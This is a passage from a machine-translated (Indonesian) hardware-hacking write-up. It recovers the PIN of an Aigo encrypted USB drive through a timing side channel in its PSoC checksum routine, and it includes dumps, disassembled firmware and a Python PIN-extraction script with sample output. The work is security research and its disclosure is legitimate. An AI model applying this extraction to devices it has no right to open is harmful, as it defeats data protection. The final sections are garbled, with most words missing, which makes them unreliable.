00058 F8 E7 00 #  E7? 00058 D0 17 01 [...] 00059 E7 E7 00 00060 17 17 00 #  [...] 00062 00 17 00 00062 00 17 00 00063 01 17 01 # , !        00063 01 17 01 [...] 00075 CC 17 01 # , 0x117-0xE7: 0x30</code> </pre> <br><p>  Pada saat yang sama, kami memiliki masalah: karena kami beroperasi pada checksum aktual, byte nol tidak mengubah nilai baca.  Namun, karena seluruh prosedur perhitungan (8192 byte) membutuhkan 0,1478 detik (dengan sedikit penyimpangan di setiap awal), yang kira-kira sama dengan 18,04 μs per byte, kita dapat menggunakan waktu ini untuk memeriksa nilai checksum pada waktu yang sesuai.  Untuk proses pertama, semuanya dibaca dengan mudah, karena durasi prosedur komputasi selalu hampir sama.  Namun, akhir dari dump ini kurang akurat, karena “penyimpangan waktu yang tidak signifikan” dengan setiap putaran disimpulkan dan menjadi signifikan: </p><br><pre> <code class="plaintext hljs">134023 D0 02 DD 134023 CC D2 DC 134023 CC D2 DC 134023 CC D2 DC 134023 FB D2 DC 134023 3F D2 DC 134023 CC D2 DC 134024 02 02 DC 134024 CC D2 DC 134024 F9 02 DC 134024 03 02 DD 134024 21 02 DD 134024 02 D2 DC 134024 02 02 DC 134024 02 02 DC 134024 F8 D2 DC 134024 F8 D2 DC 134025 CC D2 DC 134025 EF D2 DC 134025 21 02 DD 134025 F8 D2 DC 134025 21 02 DD 134025 CC D2 DC 134025 04 D2 DC 134025 FB D2 DC 134025 CC D2 DC 134025 FB 02 DD 134026 03 02 DD 134026 21 02 DD</code> </pre> <br><p>  Ini adalah 10 kesedihan untuk setiap keterlambatan mikrodetik.  Total waktu operasi untuk membuang semua 8192 byte flash drive adalah sekitar 48 jam. </p><br><a name="a73"></a><br><h2 id="73-rekonstrukciya-flesh-binarnika">  7.3.  Rekonstruksi biner flash </h2><br><p>  Saya belum selesai menulis kode yang sepenuhnya merekonstruksi kode program flash drive, dengan mempertimbangkan semua penyimpangan dalam waktu.  Namun, saya sudah memulihkan awal kode ini.  Untuk memastikan saya melakukannya dengan benar, saya membongkar menggunakan m8cdis: </p><br><pre> <code class="plaintext hljs">0000: 80 67 jmp 0068h ; Reset vector [...] 0068: 71 10 or F,010h 006a: 62 e3 87 mov reg[VLT_CR],087h 006d: 70 ef and F,0efh 006f: 41 fe fb and reg[CPU_SCR1],0fbh 0072: 50 80 mov A,080h 0074: 4e swap A,SP 0075: 55 fa 01 mov [0fah],001h 0078: 4f mov X,SP 0079: 5b mov A,X 007a: 01 03 add A,003h 007c: 53 f9 mov [0f9h],A 007e: 55 f8 3a mov [0f8h],03ah 0081: 50 06 mov A,006h 0083: 00 ssc [...] 0122: 18 pop A 0123: 71 10 or F,010h 0125: 43 e3 10 or reg[VLT_CR],010h 0128: 70 00 and F,000h ; Paging mode changed from 3 to 0 012a: ef 62 jacc 008dh 012c: e0 00 jacc 012dh 012e: 71 10 or F,010h 0130: 62 e0 02 mov reg[OSC_CR0],002h 0133: 70 ef and F,0efh 0135: 62 e2 00 mov reg[INT_VC],000h 0138: 7c 19 30 lcall 1930h 013b: 8f ff jmp 013bh 013d: 50 08 mov A,008h 013f: 7f ret</code> </pre> <br><p>  Terlihat cukup bisa dipercaya! </p><br><a name="a74"></a><br><h2 id="74-nahodim-adres-hraneniya-pinkoda">  7.4.  Temukan alamat penyimpanan kode PIN </h2><br><p>  Sekarang kita dapat membaca checksum pada saat kita membutuhkan, kita dapat dengan mudah memeriksa bagaimana dan di mana itu berubah ketika kita: </p><br><ul><li>  masukkan kode PIN yang salah; </li><li>  ubah kode pin. </li></ul><br><p>  Pertama, untuk menemukan perkiraan alamat penyimpanan, saya mengambil dump checksum dalam peningkatan 10 ms setelah reboot.  Kemudian saya memasukkan kode PIN yang salah dan melakukan hal yang sama. </p><br><p>  Hasilnya tidak terlalu menyenangkan, karena ada banyak perubahan.  Tetapi pada akhirnya, saya dapat membuktikan bahwa checksum berubah di suatu tempat dalam interval antara 120.000 μs dan 140.000 μs keterlambatan.  Tapi "kode pin" yang saya dapatkan di sana benar-benar salah - karena artefak prosedur delayMicroseconds, yang melakukan hal-hal aneh ketika 0 diteruskan ke sana. </p><br><p>  Kemudian, setelah menghabiskan hampir 3 jam, saya ingat bahwa panggilan sistem SRS CheckSum pada input menerima argumen yang menentukan jumlah blok untuk checksum!  T.O.  kita dapat dengan mudah melokalkan alamat penyimpanan kode PIN dan penghitung "upaya yang salah", akurat ke blok 64-byte. </p><br><p>  Proses awal saya memberikan hasil sebagai berikut: </p><br><p><img src="https://habrastorage.org/webt/0n/ol/xc/0nolxcgp8espvfdubrhrmvmbgrg.png"></p><br><p>  Kemudian saya mengubah kode PIN dari "123456" menjadi "1234567" dan menerima: </p><br><p><img src="https://habrastorage.org/webt/0r/zp/s2/0rzps2e2mwldmhtot1tswiv7mdq.png"></p><br><p>  Dengan demikian, kode PIN dan penghitung upaya yang salah tampaknya disimpan di blok No. 126. </p><br><a name="a75"></a><br><h2 id="75-snimaem-damp-bloka-126">  7.5.  Kami membuang dump blok No. 126 </h2><br><p>  Blok No. 126 harus ditempatkan di suatu tempat di wilayah 125x64x18 = 144000mks, dari awal perhitungan checksum, di dump penuh saya, dan itu terlihat cukup dapat dipercaya.  Kemudian, setelah secara manual memilah banyak dump yang tidak valid (karena akumulasi "sedikit penyimpangan dalam waktu"), saya akhirnya mendapatkan byte ini (dengan penundaan 145527 μs): </p><br><p><img src="https://habrastorage.org/webt/ji/31/ye/ji31yewphovunymnjxp0fcpwrdw.png"></p><br><p>  Jelas bahwa kode PIN disimpan dalam bentuk yang tidak dienkripsi!  Nilai-nilai ini tentu saja tidak ditulis dalam kode ASCII, tetapi ternyata, mereka mencerminkan pembacaan yang diambil dari keyboard kapasitif. </p><br><p>  Akhirnya, saya menjalankan beberapa tes lagi untuk menemukan di mana penghitung upaya yang salah disimpan.  Inilah hasilnya: </p><br><p><img src="https://habrastorage.org/webt/dc/r5/tf/dcr5tf0yevdxcg5lyrbcr9srowu.png"></p><br><p>  0xFF - berarti "15 upaya", dan berkurang dengan setiap upaya yang salah. </p><br><a name="a76"></a><br><h2 id="76-vosstanovlenie-pinkoda">  7.6.  Pemulihan kode pin </h2><br><p>  Ini kode jelek saya yang menyatukan semua hal di atas: </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump_pin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> pin_map = {<span class="hljs-number"><span class="hljs-number">0x24</span></span>: <span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-number"><span class="hljs-number">0x25</span></span>: <span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-number"><span class="hljs-number">0x26</span></span>: <span class="hljs-string"><span class="hljs-string">"2"</span></span>, <span class="hljs-number"><span class="hljs-number">0x27</span></span>:<span class="hljs-string"><span class="hljs-string">"3"</span></span>, <span class="hljs-number"><span class="hljs-number">0x20</span></span>: <span class="hljs-string"><span class="hljs-string">"4"</span></span>, <span class="hljs-number"><span class="hljs-number">0x21</span></span>: <span class="hljs-string"><span class="hljs-string">"5"</span></span>, <span class="hljs-number"><span class="hljs-number">0x22</span></span>: <span class="hljs-string"><span class="hljs-string">"6"</span></span>, <span class="hljs-number"><span class="hljs-number">0x23</span></span>: <span class="hljs-string"><span class="hljs-string">"7"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2c</span></span>: <span class="hljs-string"><span class="hljs-string">"8"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2d</span></span>: <span class="hljs-string"><span class="hljs-string">"9"</span></span>} last_csum = <span class="hljs-number"><span class="hljs-number">0</span></span> pin_bytes = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">145495</span></span>, <span class="hljs-number"><span class="hljs-number">145719</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>): csum = csum_at(delay, <span class="hljs-number"><span class="hljs-number">1</span></span>) byte = (csum-last_csum)&amp;<span class="hljs-number"><span class="hljs-number">0xFF</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"%05d %04x (%04x) =&gt; %02x"</span></span> % (delay, csum, last_csum, byte) pin_bytes.append(byte) last_csum = csum <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"PIN: "</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(pin_bytes)): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> pin_bytes[i] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> pin_map: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> pin_map[pin_bytes[i]], <span class="hljs-keyword"><span class="hljs-keyword">print</span></span></code> </pre> <br><p>  Ini adalah hasil eksekusi: </p><br><pre> <code class="plaintext hljs">$ ./psoc.py syncing: KO OK Resetting PSoC: KO Resetting PSoC: KO Resetting PSoC: OK 145495 53e2 (0000) =&gt; e2 145511 5407 (53e2) =&gt; 25 145527 542d (5407) =&gt; 26 145543 5454 (542d) =&gt; 27 145559 5474 (5454) =&gt; 20 145575 5495 (5474) =&gt; 21 145591 54b7 (5495) =&gt; 22 145607 54da (54b7) =&gt; 23 145623 5506 (54da) =&gt; 2c 145639 5506 (5506) =&gt; 00 145655 5533 (5506) =&gt; 2d 145671 554c (5533) =&gt; 19 145687 554e (554c) =&gt; 02 145703 554e (554e) =&gt; 00 PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  Hore!  Itu berhasil! </p><br><p>  Harap perhatikan bahwa nilai keterlambatan yang digunakan oleh saya kemungkinan besar relevan untuk satu PSoC spesifik - yang saya gunakan. </p><br><a name="a8"></a><br><h1 id="8-chto-dalshe">  8. Apa selanjutnya? </h1><br><p> ,     PSoC,     Aigo: </p><br><ul><li>    SRAM,      ; </li><li>      ,   «   »,    . </li></ul><br><p>   ,       – -   .       : </p><br><ul><li>       ,      «   »; </li><li>  FPGA-       (    Arduino); </li><li>    :    ,     RAM,   ,       RAM,  .   Arduino    - ,    Arduino  5 ,            3,3 . </li></ul><br><p>   ,      –   ,     .     ,         , –  ,          . </p><br><p>  SROM,        ReadBlock,       ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="></a>     –     ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">«REcon Brussels 2017»</a> . </p><br><p>    ,      –    :    SRAM,      . </p><br><a name="a9"></a><br><h1 id="9-zaklyuchenie"> 9.  </h1><br><p> ,      ,         ( «») …      (),         ! </p><br><p>     Aigo?  -   HDD-,   2015   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="></a>  SyScan,        HDD-,   ,       .  :-) </p><br><p>          .     40 .     (   )    ( ).    40   ,       .    . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id455529/">https://habr.com/ru/post/id455529/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id455517/index.html">Lulusan program Netologi "Ilmu Data" tentang pekerjaannya di sektor perbankan</a></li>
<li><a href="../id455519/index.html">Bagaimana kami menerapkan orientasi pengembang baru</a></li>
<li><a href="../id455523/index.html">Implementasi OpenStack LBaaS UI</a></li>
<li><a href="../id455525/index.html">Zimbra dan Pertahanan Bom Surat</a></li>
<li><a href="../id455527/index.html">Apa yang tertulis di sini? Di belakang layar objek JavaScript</a></li>
<li><a href="../id455533/index.html">Bubble Physics: Pencarian untuk Mekanisme Penghancuran Busa</a></li>
<li><a href="../id455535/index.html">Mengelola sertifikat SSL / TLS di awan dan kontainer - bukan pekerjaan manusia</a></li>
<li><a href="../id455537/index.html">Optimalisasi Pencarian Luas: Cara memproses grafik dengan 10 miliar status</a></li>
<li><a href="../id455539/index.html">Paranormal seluler: 10 fakta baru tentang bagaimana perangkat yang dapat dikenakan mengawasi Anda</a></li>
<li><a href="../id455543/index.html">Apakah Kubernetes Cluster mudah dan nyaman untuk disiapkan? Umumkan operator tambahan</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>